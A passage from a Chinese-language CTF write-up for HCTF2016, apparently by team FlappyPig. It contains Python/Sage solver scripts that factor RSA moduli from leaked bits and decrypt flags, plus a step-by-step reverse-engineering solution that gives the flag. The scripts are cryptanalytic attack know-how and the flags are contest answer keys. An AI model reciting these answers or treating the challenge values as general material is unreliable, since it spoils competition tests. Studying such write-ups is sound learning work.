plain">return&nbsp;("0"+tmp).decode("hex")</code></div><div class="line number27 index26 alt2"><code class="plain plain">n=0xa3f7fc8a9cdbf7029c529178d96cbf2228e36fbd704a7d383695f6e8eb54cfd58f2c13c55a5d0dae2be170865f92624c183e20d31e2d8c5a9b1481d32fd19f4e4f90fc4cea43238cd8c613bda744812361d5f4fdee12721a7e464fad69bdb5a8c5b687e2ae2f203cc620a096ad11ecf2bf155bf4f1c10dff7384a4a566965d6257a6dd588d223985c042947ee5ea5ff003283cb6bf89771901b2f1b1c890895861a1461b22639c1635abc50779fe5163eec1ffff9733bca4c33f593d4dfecfdca03d4cc2e220b2f323d1c3eec12889a23d1b0d5c00ae8070cb2d09a972ab23d0b4d70824335569eaa51539c3557b14972bcc1dd794e0ff997bb032acce40e567L</code></div><div class="line number28 index27 alt1"><code class="plain plain">e=0x10001</code></div><div class="line number29 index28 alt2"><code class="plain plain">e2=0x76b3</code></div><div class="line number30 index29 alt1"><code class="plain plain">c=0x48c22e2c71354fc7b6b9237e1e14563c9144243ffbef424c39fd1ee293fcf6569d0edc0ad807deaf1d47b34bcad0e7aeff5cf6efa39445773c1743b31ee4c70cff62f5906a14efdc74304258950f1dddb09ffac8d683d7d9ab436430bd4ff643bb51767632c002c97d75559b5ac4dda6cc1c1426b0d992b0783f6b7f521a1fb96ccd41078fde1d76e0509d7828fc50673a668e99889ef729d68260b2c458356fcbcdb0af21da831eeb06c98a48dc235b1d46e6451b4d22a2668e5b429534cfedbd1dbdb8ace6323844c9a52eb9dc8dfe9d26268f180d8e5f27d5fc7ee7e0022a4879cc68a0c9a46129bd25eac5758088a6cdc33d9458f72b381d931c212be51L</code></div><div class="line number31 index30 alt2"><code class="plain plain">u=int(bin(n)[2:-1][128:128+640],2)</code></div><div class="line number32 index31 alt1"><code class="plain plain">p4=pi_b(u,0)</code></div><div class="line number33 index32 alt2"><code class="plain plain">print&nbsp;bin(p4)</code></div><div class="line number34 index33 alt1"><code class="plain plain">temp="1101111100001101011101100001010001101110000110001111111100010100111000010001110001011100000111001000111100000010101101011011010010011101001100111010010100011010111011001001111101000111111111110101101100010101111111111101111100100000010010111011010100000111001101010001110101010111100010001100010111111001001110010010011101100001001011111101011110111011011111000100010000111001000101011101001110100011110100101010100000001001101011111111100011110010010110111000111001010010111101111110001001010101001101101000000101011010000011100001001100000011111011011010000110010100111000011101110000110001010010010000010111000111100110010111110010111111"</code></div><div class="line number35 index34 alt2"><code class="plain plain">temp2="1"*384</code></div><div class="line number36 index35 alt1"><code class="plain plain">print&nbsp;len(temp+temp2)</code></div><div class="line number37 index36 alt2"><code class="plain plain">qbar&nbsp;=int(temp+temp2,2)</code></div><div class="line number38 index37 alt1"><code class="plain plain">cha=15483423385776591648944200564143931994102240603631297038751816607837858072316729972685015604287550574333116738645234</code></div><div class="line number39 index38 alt2"><code class="plain plain">q=qbar-cha</code></div><div class="line number40 index39 alt1"><code class="plain plain">p=n&nbsp;/&nbsp;q</code></div><div class="line number41 index40 alt2"><code class="plain plain">import&nbsp;primefac</code></div><div class="line number42 index41 alt1"><code class="plain plain">d1=primefac.modinv(e,(p-1)*(q-1))&nbsp;%&nbsp;((p-1)*(q-1))</code></div><div class="line number43 index42 alt2"><code class="plain plain">d2=primefac.modinv(e2,(p-1)*(q-1))&nbsp;%&nbsp;((p-1)*(q-1))</code></div><div class="line number44 index43 alt1"><code class="plain plain">print&nbsp;d1</code></div><div class="line number45 index44 alt2"><code class="plain plain">print&nbsp;d2</code></div><div class="line number46 index45 alt1"><code class="plain plain">t1=pow(c,d1,n)</code></div><div class="line number47 index46 alt2"><code class="plain plain">t2=pow(c,d2,n)</code></div><div class="line number48 index47 alt1"><code class="plain plain">print&nbsp;num2str(t2)</code></div></div></td></tr></tbody></table><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span><br></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">Crypto So Amazing</span></strong></span></p><hr><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">首先t是n的前1024bit，yu是t的前半部分，yl是t的后半部分，通过如下方法可以计算出spub和spriv：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><table border="0" cellpadding="0" cellspacing="0" class="syntaxhighlighter  plain"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div><div class="line number3 index2 alt2">3</div><div class="line number4 index3 alt1">4</div><div class="line number5 index4 alt2">5</div><div class="line number6 index5 alt1">6</div><div class="line number7 index6 alt2">7</div><div class="line number8 index7 alt1">8</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="plain plain">t=int(bin(n)[2:][0:1024],2)</code></div><div class="line number2 index1 alt1"><code class="plain plain">yu=int(bin(t)[2:][0:512],2)</code></div><div class="line number3 index2 alt2"><code class="plain plain">yl=int(bin(t)[2:][512:],2)</code></div><div class="line number4 index3 alt1"><code class="plain plain">xu=F_hash(yl)^yu</code></div><div class="line number5 index4 alt2"><code class="plain plain">xl=H_hash(xu)^yl</code></div><div class="line number6 index5 alt1"><code class="plain plain">spub=int(bin(xl)[len(bin(xl))-256:len(bin(xl))],2)</code></div><div class="line number7 index6 alt2"><code class="plain plain">spriv=pow(spub,b,P)</code></div><div class="line number8 index7 alt1"><code class="plain plain">print&nbsp;spriv</code></div></div></td></tr></tbody></table><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">spriv作为种子进行了若干次随机生成了p，不知道随机的次数，后面本以为和2差不多，但是第一次是被sage和python的random的序列不一样坑了。解决了这个问题后，发现还是解不出来。后爆出一个hint，给了一个不够2/3bit的泄露也可以解的脚本，而后跑出。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><table border="0" cellpadding="0" cellspacing="0" class="syntaxhighlighter  plain"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div><div class="line number3 index2 alt2">3</div><div class="line number4 index3 alt1">4</div><div class="line number5 index4 alt2">5</div><div class="line number6 index5 alt1">6</div><div class="line number7 index6 alt2">7</div><div class="line number8 index7 alt1">8</div><div class="line number9 index8 alt2">9</div><div class="line number10 index9 alt1">10</div><div class="line number11 index10 alt2">11</div><div class="line number12 index11 alt1">12</div><div class="line number13 index12 alt2">13</div><div class="line number14 index13 alt1">14</div><div class="line number15 index14 alt2">15</div><div class="line number16 index15 alt1">16</div><div class="line number17 index16 alt2">17</div><div class="line number18 index17 alt1">18</div><div class="line number19 index18 alt2">19</div><div class="line number20 index19 alt1">20</div><div class="line number21 index20 alt2">21</div><div class="line number22 index21 alt1">22</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="plain plain">from&nbsp;rrr&nbsp;import&nbsp;get_p4</code></div><div class="line number2 index1 alt1"><code class="plain plain">n&nbsp;=&nbsp;0xf7a8a487bc5c8127ac30cfbfc08e042580f359edce3db416b8a9abcb0e8dcac5404bb0eea3076966a78bb8e726e6fea79d305cc7c2cddb3dd2578a64b5591df1c9716878f35f1967398861cb368886b60c6d0c2984be3ead8dcdd80d68bb094805068b5d157c16d2b56cf0c3f06797b07bf3a7ab2a5099762958feaf72a212a63c74a4fb7da4092e6a91e72bf74ee961b995545891290c50cb28151b540efdedef9d4cc1c104758050c21dda8be8310fc7e005a08cedbcc8500fe0f9fdaa044e7cb07387060358add1d82521b5f8697b6a8ca2bd19a363bae7558e94404a1c4b82ee98878f9dff0e21030e020c698778aa645001f4c7726d3ac04720295975c9L</code></div><div class="line number3 index2 alt2"><code class="plain plain">pbits&nbsp;=&nbsp;1024</code></div><div class="line number4 index3 alt1"><code class="plain plain">g_p&nbsp;=&nbsp;get_p4()</code></div><div class="line number5 index4 alt2"><code class="plain plain">while&nbsp;True:</code></div><div class="line number6 index5 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">p4&nbsp;=&nbsp;g_p.next()</code></div><div class="line number7 index6 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">#p4&nbsp;=&nbsp;0x81a722c9fc2b2ed061fdab737e3893506eae71ca6415fce14c0f9a45f8e2300711119fa0a5135a053e654fead010b96e987841e47db586a55e3d4494613aa0cc4e4ab59fc6a958b5</code></div><div class="line number8 index7 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">kbits&nbsp;=&nbsp;pbits&nbsp;-&nbsp;576</code></div><div class="line number9 index8 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">p4&nbsp;=&nbsp;p4&nbsp;&lt;&lt;&nbsp;kbits</code></div><div class="line number10 index9 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">PR.&lt;x&gt;&nbsp;=&nbsp;PolynomialRing(Zmod(n))</code></div><div class="line number11 index10 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">f&nbsp;=&nbsp;x&nbsp;+&nbsp;p4</code></div><div class="line number12 index11 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">x0&nbsp;=&nbsp;f.small_roots(X=2^kbits,&nbsp;beta=0.4)</code></div><div class="line number13 index12 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">if&nbsp;len(x0)&nbsp;==&nbsp;0:</code></div><div class="line number14 index13 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">continue</code></div><div class="line number15 index14 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">print&nbsp;"x:&nbsp;%s"&nbsp;%hex(int(x0[0]))</code></div><div class="line number16 index15 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">p&nbsp;=&nbsp;p4+x0[0]</code></div><div class="line number17 index16 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">print&nbsp;"p:&nbsp;",&nbsp;hex(int(p))</code></div><div class="line number18 index17 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">assert&nbsp;n&nbsp;%&nbsp;p&nbsp;==&nbsp;0</code></div><div class="line number19 index18 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">q&nbsp;=&nbsp;n/int(p)</code></div><div class="line number20 index19 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">print&nbsp;"q:&nbsp;",&nbsp;hex(int(q))</code></div><div class="line number21 index20 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">print&nbsp;"p4:&nbsp;",&nbsp;hex(p4)</code></div><div class="line number22 index21 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">break</code></div></div></td></tr></tbody></table><p style="text-align:center"><a href="./【CTF攻略】FlappyPig HCTF2016 Writeup - 安全客 - 有思想的安全新媒体_files/t011883a98e15dce85d.png" target="_blank"><img src="./【CTF攻略】FlappyPig HCTF2016 Writeup - 安全客 - 有思想的安全新媒体_files/t011883a98e15dce85d.png" title="t01d6f0385837fc46f3.png" alt="http://p4.qhimg.com/t01d6f0385837fc46f3.png" style="visibility: visible;"></a></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">生成p直接计算：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><table border="0" cellpadding="0" cellspacing="0" class="syntaxhighlighter  plain"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div><div class="line number3 index2 alt2">3</div><div class="line number4 index3 alt1">4</div><div class="line number5 index4 alt2">5</div><div class="line number6 index5 alt1">6</div><div class="line number7 index6 alt2">7</div><div class="line number8 index7 alt1">8</div><div class="line number9 index8 alt2">9</div><div class="line number10 index9 alt1">10</div><div class="line number11 index10 alt2">11</div><div class="line number12 index11 alt1">12</div><div class="line number13 index12 alt2">13</div><div class="line number14 index13 alt1">14</div><div class="line number15 index14 alt2">15</div><div class="line number16 index15 alt1">16</div><div class="line number17 index16 alt2">17</div><div class="line number18 index17 alt1">18</div><div class="line number19 index18 alt2">19</div><div class="line number20 index19 alt1">20</div><div class="line number21 index20 alt2">21</div><div class="line number22 index21 alt1">22</div><div class="line number23 index22 alt2">23</div><div class="line number24 index23 alt1">24</div><div class="line number25 index24 alt2">25</div><div class="line number26 index25 alt1">26</div><div class="line number27 index26 alt2">27</div><div class="line number28 index27 alt1">28</div><div class="line number29 index28 alt2">29</div><div class="line number30 index29 alt1">30</div><div class="line number31 index30 alt2">31</div><div class="line number32 index31 alt1">32</div><div class="line number33 index32 alt2">33</div><div class="line number34 index33 alt1">34</div><div class="line number35 index34 alt2">35</div><div class="line number36 index35 alt1">36</div><div class="line number37 index36 alt2">37</div><div class="line number38 index37 alt1">38</div><div class="line number39 index38 alt2">39</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="plain plain">from&nbsp;Crypto.Util.number&nbsp;import&nbsp;size,&nbsp;getPrime,&nbsp;long_to_bytes,&nbsp;bytes_to_long,&nbsp;isPrime,&nbsp;getRandomNBitInteger</code></div><div class="line number2 index1 alt1"><code class="plain plain">from&nbsp;hashlib&nbsp;import&nbsp;sha512</code></div><div class="line number3 index2 alt2"><code class="plain plain">def&nbsp;int_add(x1,&nbsp;x2):</code></div><div class="line number4 index3 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;</code><code class="plain plain">return&nbsp;bytes_to_long(long_to_bytes(x1)&nbsp;+&nbsp;long_to_bytes(x2))</code></div><div class="line number5 index4 alt2"><code class="plain plain">def&nbsp;H_hash(x):</code></div><div class="line number6 index5 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;</code><code class="plain plain">h&nbsp;=&nbsp;sha512(long_to_bytes(x)).hexdigest()</code></div><div class="line number7 index6 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;</code><code class="plain plain">return&nbsp;int(h,&nbsp;16)</code></div><div class="line number8 index7 alt1"><code class="plain plain">def&nbsp;F_hash(x):</code></div><div class="line number9 index8 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;</code><code class="plain plain">h&nbsp;=&nbsp;sha512(long_to_bytes(x/4)).hexdigest()</code></div><div class="line number10 index9 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;</code><code class="plain plain">return&nbsp;int(h,&nbsp;16)</code></div><div class="line number11 index10 alt2"><code class="plain plain">P=0xab72f3a7d42573afe7a71c23dbe3cf8feb7d8b9026a9b1c6174a0c598ceb88a1L</code></div><div class="line number12 index11 alt1"><code class="plain plain">b=9718272430951996082</code></div><div class="line number13 index12 alt2"><code class="plain plain">n=&nbsp;0xf7a8a487bc5c8127ac30cfbfc08e042580f359edce3db416b8a9abcb0e8dcac5404bb0eea3076966a78bb8e726e6fea79d305cc7c2cddb3dd2578a64b5591df1c9716878f35f1967398861cb368886b60c6d0c2984be3ead8dcdd80d68bb094805068b5d157c16d2b56cf0c3f06797b07bf3a7ab2a5099762958feaf72a212a63c74a4fb7da4092e6a91e72bf74ee961b995545891290c50cb28151b540efdedef9d4cc1c104758050c21dda8be8310fc7e005a08cedbcc8500fe0f9fdaa044e7cb07387060358add1d82521b5f8697b6a8ca2bd19a363bae7558e94404a1c4b82ee98878f9dff0e21030e020c698778aa645001f4c7726d3ac04720295975c9L</code></div><div class="line number14 index13 alt1"><code class="plain plain">spriv=76515803399948578070392316249460231617205640228540294074078216016927174232385</code></div><div class="line number15 index14 alt2"><code class="plain plain">t&nbsp;=&nbsp;bytes_to_long(long_to_bytes(n)[:128])</code></div><div class="line number16 index15 alt1"><code class="plain plain">yu&nbsp;=&nbsp;bytes_to_long(long_to_bytes(t)[:64])</code></div><div class="line number17 index16 alt2"><code class="plain plain">yl&nbsp;=&nbsp;bytes_to_long(long_to_bytes(t)[64:])</code></div><div class="line number18 index17 alt1"><code class="plain plain">xu&nbsp;=&nbsp;F_hash(yl)^yu</code></div><div class="line number19 index18 alt2"><code class="plain plain">xl&nbsp;=&nbsp;H_hash(xu)^yl</code></div><div class="line number20 index19 alt1"><code class="plain plain">s&nbsp;=&nbsp;int_add(xu,&nbsp;xl)</code></div><div class="line number21 index20 alt2"><code class="plain plain">print&nbsp;hex(s)</code></div><div class="line number22 index21 alt1"><code class="plain plain">spub&nbsp;=&nbsp;s&amp;(2**256-1)</code></div><div class="line number23 index22 alt2"><code class="plain plain">print&nbsp;hex(spub)</code></div><div class="line number24 index23 alt1"><code class="plain plain">spriv&nbsp;=&nbsp;pow(spub,&nbsp;b,&nbsp;P)</code></div><div class="line number25 index24 alt2"><code class="plain plain">print&nbsp;spriv</code></div><div class="line number26 index25 alt1"><code class="plain plain">p=0x81a722c9fc2b2ed061fdab737e3893506eae71ca6415fce14c0f9a45f8e2300711119fa0a5135a053e654fead010b96e987841e47db586a55e3d4494613aa0cc4e4ab59fc6a958b59b825931b9b5cab0bfa07c6b0c4ac673060530d5ad8fa04f63c9f026f32c243c9a67a0fd223783dce9ad2e6a0524d559ed0c905c00323db5L</code></div><div class="line number27 index26 alt2"><code class="plain plain">q=n/p</code></div><div class="line number28 index27 alt1"><code class="plain plain">import&nbsp;primefac</code></div><div class="line number29 index28 alt2"><code class="plain plain">e=0x4177</code></div><div class="line number30 index29 alt1"><code class="plain plain">d=primefac.modinv(e,(p-1)*(q-1))&nbsp;%&nbsp;((p-1)*(q-1))</code></div><div class="line number31 index30 alt2"><code class="plain plain">c=0xae580a97fec8c445276f6eeb54f4a8d0cab61eaa78a9d5824e61c13898e2a7f78bda4432e863b0b38b84564b62b0c557822c1b997a8a11c85ecd19b9a378e285c270af791750feb2b1954b5254d4521aaf98094e28f61ece61059802162f3af63c9ea9caa02710b4cb00ad074a4029537699dde481a8055f33a17c7055f02334b977b7db508f96c483a8a5dcd424d5cb6b583c6772ae45c99c9779cddd8bd9480f2aa50661c8fdf1b4f96d09e4ad058faeb354a522be5fc8a7014f149c8382e30ff5e844f958ed9b91292cedd5f82a375788c87d363517c1db11735a5d13bfea18890e9cd289880a659d70bee79525e0a368abf2cf9fdc9d3a692098d09b7a96L</code></div><div class="line number32 index31 alt1"><code class="plain plain">m=pow(c,d,n)</code></div><div class="line number33 index32 alt2"><code class="plain plain">def&nbsp;num2str(num):</code></div><div class="line number34 index33 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">tmp=hex(num)[2:].replace("L","")</code></div><div class="line number35 index34 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">if&nbsp;len(tmp)&nbsp;%&nbsp;2&nbsp;==&nbsp;0:</code></div><div class="line number36 index35 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">return&nbsp;tmp.decode("hex")</code></div><div class="line number37 index36 alt2"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">else:</code></div><div class="line number38 index37 alt1"><code class="plain spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="plain plain">return&nbsp;("0"+tmp).decode("hex")</code></div><div class="line number39 index38 alt2"><code class="plain plain">print&nbsp;num2str(m)</code></div></div></td></tr></tbody></table><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span><br></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">最正常的逆向</span></strong></span></p><hr><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">一道很直接的逆向题，按照程序的逻辑一步一步来：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">1.首先限制输入的长度为26，然后用这个长度去解码了一个函数。</span></p><p style="text-align:center"><a href="./【CTF攻略】FlappyPig HCTF2016 Writeup - 安全客 - 有思想的安全新媒体_files/t015f020e4a3f69aeb6.png" target="_blank"><img src="./【CTF攻略】FlappyPig HCTF2016 Writeup - 安全客 - 有思想的安全新媒体_files/t015f020e4a3f69aeb6.png" title="t015ee83633cd88ef63.png" alt="http://p9.qhimg.com/t015ee83633cd88ef63.png" style="visibility: visible;"></a></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">2.用一个简单的xor判断前四位：得到hctf。之后再次解码函数，进行验证。</span></p><p style="text-align:center"><a href="./【CTF攻略】FlappyPig HCTF2016 Writeup - 安全客 - 有思想的安全新媒体_files/t01686a470a455af6d6.png" target="_blank"><img src="./【CTF攻略】FlappyPig HCTF2016 Writeup - 安全客 - 有思想的安全新媒体_files/t01686a470a455af6d6.png" title="t01f58f94b782283c08.png" alt="http://p8.qhimg.com/t01f58f94b782283c08.png" style="visibility: visible;"></a></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">3.之后进行下一次验证，首先获得大括号内的前四个字符，将其按照aci分割成两个部分</span></p><p style="text-align:center"><a href="./【CTF攻略】FlappyPig HCTF2016 Writeup - 安全客 - 有思想的安全新媒体_files/t011a52d8bde033a302.png" target="_blank"><img src="./【CTF攻略】FlappyPig HCTF2016 Writeup - 安全客 - 有思想的安全新媒体_files/t011a52d8bde033a302.png" title="t0121451dc053eed094.png" alt="http://p1.qhimg.com/t0121451dc053eed094.png" style="visibility: visible;"></a></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">3.1然后会根据之前的hctf初始化一个table。</span></p><p style="text-align:center"><a href="./【CTF攻略】FlappyPig HCTF2016 Writeup - 安全客 - 有思想的安全新媒体_files/t0105510a187744a045.png" target="_blank"><img src="./【CTF攻略】FlappyPig HCTF2016 Writeup - 安全客 - 有思想的安全新媒体_files/t0105510a187744a045.png" title="t01bc3ad87549df27c0.png" alt="http://p8.qhimg.com/t01bc3ad87549df27c0.png" style="visibility: visible;"></a></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">3.2用该表参与运算后，将结果和xor_result = 0x8A012F269090095DLL;比较。最后可以确定结果为The_。然后继续解码函数进入下一个验证。</span></p><p style="text-align:center"><a href="./【CTF攻略】FlappyPig HCTF2016 Writeup - 安全客 - 有思想的安全新媒体_files/t012b19330f5c51fef0.png" target="_blank"><img src="./【CTF攻略】FlappyPig HCTF2016 Writeup - 安全客 - 有思想的安全新媒体_files/t012b19330f5c51fef0.png" title="t0136fcee7e8d97ec73.png" alt="http://p3.qhimg.com/t0136fcee7e8d97ec73.png" style="visibility: visible;"></a></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">4.接下来是一个逻辑推到的过程，循环两次每一次将三个字节的key分解成四个字节，最后和八个字节比较，正确的结果是result_ = 5709797187881621056LL;可以推出这个六个字节为</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">Basic_，然后进入下一层验证</span></p><p style="text-align:center"><a href="./【CTF攻略】FlappyPig HCTF2016 Writeup - 安全客 - 有思想的安全新媒体_files/t0121bce0d7316e3d06.png" target="_blank"><img src="./【CTF攻略】FlappyPig HCTF2016 Writeup - 安全客 - 有思想的安全新媒体_files/t0121bce0d7316e3d06.png" title="t015ce53bd2e186be16.png" alt="http://p7.qhimg.com/t015ce53bd2e186be16.png" style="visibility: visible;"></a></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">5.下一个判断很简单，分割重组异或和结果比较，可以推到出六字节0f_RE_，然后继续下一个判断函数。</span></p><p style="text-align:center"><a href="./【CTF攻略】FlappyPig HCTF2016 Writeup - 安全客 - 有思想的安全新媒体_files/t017b55522823ff9cc4.png" target="_blank"><img src="./【CTF攻略】FlappyPig HCTF2016 Writeup - 安全客 - 有思想的安全新媒体_files/t017b55522823ff9cc4.png" title="t015f909820b2983acb.png" alt="http://p3.qhimg.com/t015f909820b2983acb.png" style="visibility: visible;"></a></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">6.最后一步是明码比较。</span></p><p style="text-align:center"><a href="./【CTF攻略】FlappyPig HCTF2016 Writeup - 安全客 - 有思想的安全新媒体_files/t01a4a0f073c0771614.png" target="_blank"><img src="./【CTF攻略】FlappyPig HCTF2016 Writeup - 安全客 - 有思想的安全新媒体_files/t01a4a0f073c0771614.png" title="t01c90cd31d1cc8cf62.png" alt="http://p2.qhimg.com/t01c90cd31d1cc8cf62.png" style="visibility: visible;"></a></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">7.得到最后的key为：hctf{The_Basic_0f_RE_0A1e}</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">48小时学会CPP</span></strong></span></p><hr><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">CPP混淆加密</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><table border="0" cellpadding="0" cellspacing="0" class="syntaxhighlighter  plain"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div><div class="line number3 index2 alt2">3</div><div class="line number4 index3 alt1">4</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="plain plain">template&lt;x,y&gt;A</code></div><div class="line number2 index1 alt1"><code class="plain plain">{</code></div><div class="line number3 index2 alt2"><code class="plain plain">c&nbsp;=&nbsp;enum{c=???};</code></div><div class="line number4 index3 alt1"><code class="plain plain">}</code></div></div></td></tr></tbody></table><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">然后调用A::c这种模式可以改成</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><table border="0" cellpadding="0" cellspacing="0" class="syntaxhighlighter  plain"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div><div class="line number3 index2 alt2">3</div><div class="line number4 index3 alt1">4</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="plain plain">X&nbsp;A(int&nbsp;x,int&nbsp;y)</code></div><div class="line number2 index1 alt1"><code class="plain plain">{</code></div><div class="line number3 index2 alt2"><code class="plain plain">return&nbsp;c=???;</code></div><div class="line number4 index3 alt1"><code class="plain plain">}</code></div></div></td></tr></tbody></table><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">这种函数，方便逆向；</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">逆向后发现；</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">V0和V1必须返回为1，接下来的校验才会进行，否则直接就是错误；</span></p><p style="text-align:center"><a href="./【CTF攻略】FlappyPig HCTF2016 Writeup - 安全客 - 有思想的安全新媒体_files/t01ce4f7b3065326935.png" target="_blank"><img src="./【CTF攻略】FlappyPig HCTF2016 Writeup - 安全客 - 有思想的安全新媒体_files/t01ce4f7b3065326935.png" title="t014e330939669f7148.png" alt="http://p1.qhimg.com/t014e330939669f7148.png" style="visibility: visible;"></a></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">Cfun10c函数是检测FLAG长度的，要使其返回1，必须是FLAG长度为27；</span></p><p style="text-align:center"><a href="./【CTF攻略】FlappyPig HCTF2016 Writeup - 安全客 - 有思想的安全新媒体_files/t019386435e9b0bdebd.png" target="_blank"><img src="./【CTF攻略】FlappyPig HCTF2016 Writeup - 安全客 - 有思想的安全新媒体_files/t019386435e9b0bdebd.png" title="t01936dbc87d3969c99.png" alt="http://p9.qhimg.com/t01936dbc87d3969c99.png" style="visibility: visible;"></a></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">Cfun21函数用来校验FLAG[0]~FLAG[4]以及FLAG[25]</span></p><p style="text-align:center"><a href="./【CTF攻略】FlappyPig HCTF2016 Writeup - 安全客 - 有思想的安全新媒体_files/t016f9f6965af8da1b2.png" target="_blank"><img src="./【CTF攻略】FlappyPig HCTF2016 